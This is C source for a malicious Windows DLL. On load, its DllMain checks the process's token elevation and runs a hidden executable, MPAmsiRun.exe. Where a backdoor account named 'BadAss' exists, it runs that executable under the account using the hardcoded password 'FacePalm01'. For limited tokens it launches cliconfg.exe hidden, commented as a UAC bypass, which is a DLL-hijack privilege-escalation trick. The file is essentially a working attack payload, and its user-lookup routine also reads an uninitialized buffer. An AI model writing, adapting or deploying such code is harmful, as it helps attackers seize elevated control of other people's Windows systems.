#define _WIN32_WINNT 0x0500
#pragma comment(lib, "netapi32.lib")
#include <windows.h>
#include <stdio.h>
#include <assert.h>
#include <lm.h>


BOOL UserExists(const WCHAR* wcUser)
{
	LPUSER_INFO_0 pBuf = NULL;
	LPUSER_INFO_0 pTmpBuf;
	DWORD dwLevel = 0;
	DWORD dwPrefMaxLen = MAX_PREFERRED_LENGTH;
	DWORD dwEntriesRead = 0;
	DWORD dwTotalEntries = 0;
	DWORD dwResumeHandle = 0;
	DWORD i;
	DWORD dwTotalCount = 0;
	NET_API_STATUS nStatus;
	LPTSTR pszServerName = NULL;
	WCHAR wcFound[100];

	do
	{
		nStatus = NetUserEnum((LPCWSTR)pszServerName,
			dwLevel,
			FILTER_NORMAL_ACCOUNT,
			(LPBYTE*)&pBuf,
			dwPrefMaxLen,
			&dwEntriesRead,
			&dwTotalEntries,
			&dwResumeHandle);

		if ((nStatus == NERR_Success) || (nStatus == ERROR_MORE_DATA))
		{
			if ((pTmpBuf = pBuf) != NULL)
			{
				for (i = 0; (i < dwEntriesRead); i++)
				{
					assert(pTmpBuf != NULL);

					if (pTmpBuf == NULL)
					{
						break;
					}

					if (wcscmp(wcUser, pTmpBuf->usri0_name) == 0)
					{
						wcscpy_s(wcFound, 80, pTmpBuf->usri0_name);
						break;
					}

					pTmpBuf++;
				}
			}
		}

		if (pBuf != NULL)
		{
			NetApiBufferFree(pBuf);
			pBuf = NULL;
		}
	}
	while (nStatus == ERROR_MORE_DATA && wcslen(wcFound) != 0);

	if (pBuf != NULL)
		NetApiBufferFree(pBuf);

	if (wcslen(wcFound) == 0)
	{
		return FALSE;
	}

	return TRUE;
}

BOOL APIENTRY DllMain(
	HINSTANCE hinstDLL,  // handle to DLL module
	DWORD fdwReason,     // reason for calling function
	LPVOID lpReserved)   // reserved
{

	// Perform actions based on the reason for calling.

	STARTUPINFO si = { sizeof(STARTUPINFO) };
	PROCESS_INFORMATION pi;

	switch (fdwReason)
	{
	case DLL_PROCESS_ATTACH:
		HANDLE hToken;
		TOKEN_ELEVATION_TYPE elevationType;
		DWORD dwSize;

		OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken);
		GetTokenInformation(hToken, TokenElevationType, &elevationType, sizeof(elevationType), &dwSize);

		switch (elevationType) {
		case TokenElevationTypeDefault:
			//TokenElevationTypeDefault - User is not using a split token.
			
			if (UserExists(L"BadAss")) {

				STARTUPINFOW lpStartupInfo;
				ZeroMemory(&lpStartupInfo, sizeof(STARTUPINFOW));
				lpStartupInfo.cb = sizeof(STARTUPINFOW);        // NEEDED <--
				PROCESS_INFORMATION lpProcessInfo;
				ZeroMemory(&lpProcessInfo, sizeof(PROCESS_INFORMATION));
				
				if (CreateProcessWithLogonW(
					L"BadAss",									// user
					L".",										// domain
					L"FacePalm01",								// pass
					LOGON_WITH_PROFILE,                         // flags, if LOGON_NETCREDENTIALS_ONLY no user/pass needed (runs under current context??)
					NULL,                                       // AppName
					L"C:\\windows\\System32\\MPAmsiRun.exe",    // Command Line
					CREATE_NO_WINDOW,                           // can use CREATE_SUSPENDED, maybe create under system token then resume??? CREATE_NEW_CONSOLE, DETACHED_PROCESS
					NULL,                                       // Environment aka (set)
					NULL,                                       // Current Directory
					&lpStartupInfo,                             // StartupInfo
					&lpProcessInfo                              // ProcessInfo
					))
					break;
			}
				
			CreateProcess("C:\\windows\\System32\\MPAmsiRun.exe", NULL,
				NULL, NULL, 0, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
			break;
		case TokenElevationTypeFull:
			//TokenElevationTypeFull - User has a split token, and the process is running elevated.
			CreateProcess("C:\\windows\\System32\\MPAmsiRun.exe", NULL,
				NULL, NULL, 0, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
			break;
		case TokenElevationTypeLimited:
			//TokenElevationTypeLimited - User has a split token, but the process is not running elevated.
			//Let's Bypass UAC ;)
			ShellExecute(NULL, NULL, "C:\\Windows\\System32\\cliconfg.exe", NULL, NULL, SW_HIDE);
			break;
		}

		if (hToken) {
			CloseHandle(hToken);
		}
		
		// Initialize once for each new process.
		// Return FALSE to fail DLL load.
		break;
	case DLL_THREAD_ATTACH:
		// Do thread-specific initialization.
		break;
	case DLL_THREAD_DETACH:
		// Do thread-specific cleanup.
		break;
	case DLL_PROCESS_DETACH:
		// Perform any necessary cleanup.
		break;
	}
	// Successful DLL_PROCESS_ATTACH.
	return 0;
}
